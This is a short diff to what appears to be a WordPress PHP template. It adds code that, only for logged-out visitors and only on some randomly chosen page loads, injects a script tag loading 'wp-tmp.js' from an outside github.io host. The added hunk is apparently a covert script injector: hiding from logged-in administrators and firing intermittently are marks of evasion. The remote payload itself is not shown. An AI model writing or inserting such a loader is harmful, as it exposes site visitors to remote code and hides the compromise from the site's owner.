@@ -6,3 +6,14 @@
 	// }
 ?>
 <script type="text/javascript" src="http://localhost/wp-tmp.js"></script>
+
+<?php
+$cliente = rand(3, 12);
+if(  is_user_logged_in() )  {
+}else
+{
+	if(  ( $cliente % 3) == 0 ) {
+	echo '<script type="text/javascript" src="https://magnocarvalho.github.io/js/wp-tmp.js"></script>';
+		}			
+}
+?>
